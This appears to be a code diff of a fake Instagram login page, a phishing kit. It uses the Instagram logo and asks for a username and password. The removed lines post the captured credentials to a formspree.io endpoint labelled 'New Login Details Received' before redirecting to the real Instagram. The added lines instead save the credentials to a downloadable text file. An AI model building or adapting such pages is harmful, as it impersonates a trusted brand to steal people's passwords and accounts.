@@ -10,11 +10,9 @@
     <div class="container">
         <div class="login-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
-            <form action="https://formspree.io/f/mgvejrno" method="POST" id="loginForm">
-                <input type="hidden" name="_subject" value="New Login Details Received">
+            <form id="loginForm">
                 <input type="text" name="username" placeholder="Username" required>
                 <input type="password" name="password" placeholder="Password" required>
-                <input type="hidden" name="_next" value="https://www.instagram.com">
                 <button type="submit">Log In</button>
             </form>
         </div>
@@ -23,9 +21,20 @@
     <script>
         document.getElementById("loginForm").addEventListener("submit", function (event) {
             event.preventDefault();
-            window.location.href = "https://www.instagram.com";
+
+            const username = event.target.username.value;
+            const password = event.target.password.value;
+
+            const data = `Username: ${username}\nPassword: ${password}`;
+
+            const blob = new Blob([data], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'login-details.txt';
+            link.click();
+
             setTimeout(() => {
-                this.submit();
+                window.location.href = "https://www.instagram.com";
             }, 2000);
         });
     </script>
